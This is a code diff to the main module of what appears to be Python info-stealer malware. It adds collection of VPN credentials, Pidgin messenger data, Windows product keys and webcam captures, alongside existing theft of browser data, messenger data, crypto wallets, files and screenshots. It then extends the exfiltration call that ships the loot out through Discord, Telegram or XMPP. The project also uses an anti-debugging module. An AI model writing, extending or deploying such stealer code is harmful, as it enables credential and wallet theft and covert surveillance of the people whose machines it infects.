@@ -35,6 +35,9 @@ from files import Files_txt
 from files import file_grubber
 from secure import antiDebug
 from files import filezilla
+from vpn import vpn
+from messengers import pidgin
+from system import productkey
 
 def Start() -> None:
     if not config.Config.debuging:
@@ -65,17 +68,20 @@ def Messagers() -> None:
     config.Config.dataForMassageOther = viber.Viber(config.Config.dataForMassageOther)
     config.Config.dataForMassageOther = discord.Discord(config.Config.dataForMassageOther)
     config.Config.dataForMassageOther = whatsapp.WhatsApp(config.Config.dataForMassageOther)
+    config.Config.dataForMassageOther = pidgin.Pidgin(config.Config.dataForMassageOther)
 
 def VPN() -> None:
-    pass
+    config.Config.dataForMassageVPN= vpn.VPN(config.Config.dataForMassageVPN)
 
 def System() -> None:
     config.Config.dataForMassageSYS = system_info.SystemInfo(config.Config.dataForMassageSYS)
+    productkey.PKay()
 
 def Other() -> None:
     config.Config.dataForMassageWallets = wallets.Wallets(config.Config.dataForMassageWallets)
     programs.Programs()
     photos.Screenshot()
+    photos.WebCam()
 
 def End() -> None:
     try:
@@ -83,7 +89,7 @@ def End() -> None:
     except Exception as e:
         print(e)
     try:
-        send.Send(config.Config.sendType,config.Config.np,config.Config.dataForMassageSYS,config.Config.dataForMassageBrowsers,config.Config.dataForMassageOther,config.Config.dataForMassageWallets,config.Config.dataForMassageFiles,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
+        send.Send(config.Config.sendType,config.Config.np,config.Config.dataForMassageSYS,config.Config.dataForMassageBrowsers,config.Config.dataForMassageOther,config.Config.dataForMassageWallets,config.Config.dataForMassageFiles,config.Config.dataForMassageVPN,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
     except Exception as e:
         print(e)
     ending.End(config.Config.np)
